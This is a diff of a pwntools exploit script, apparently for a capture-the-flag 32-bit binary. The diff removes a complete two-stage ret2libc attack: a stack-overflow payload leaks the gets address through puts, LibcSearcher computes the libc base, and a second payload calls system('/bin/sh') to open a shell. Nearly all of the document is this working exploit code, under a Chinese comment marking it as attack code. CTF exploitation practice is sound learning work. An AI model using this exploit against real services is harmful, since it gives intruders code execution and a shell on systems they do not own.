@@ -136,30 +136,7 @@ context.update(log_level=PWN_LOG_LEVEL)
 ##############以下为攻击代码###############
 ##########################################
 
-payload = b'a' * (0x6c + 4)
-payload += p32(cur_elf.plt['puts'])
-payload += p32(cur_elf.sym['main'])
-payload += p32(cur_elf.got['gets'])
 
-io.sendlineafter("Please input:\n", payload)
-io.recvline()
-msg = io.recvline() # 这一行有数据嗷
-gets_addr = u32(msg[:4])
-
-libc = LibcSearcher('gets', gets_addr)
-libc_base_addr = gets_addr - libc.dump('gets')
-system_addr = libc_base_addr + libc.dump('system')
-str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')
-LOG_ADDR('libc_base_addr', libc_base_addr)
-LOG_ADDR('system_addr', system_addr)
-LOG_ADDR('str_bin_sh', str_bin_sh)
-
-payload = b'a' * (0x6c + 4)
-payload += p32(system_addr)
-payload += p32(cur_elf.got['puts'])
-payload += p32(str_bin_sh)
-
-io.sendlineafter("Please input:\n", payload)
 
 io.interactive()
 
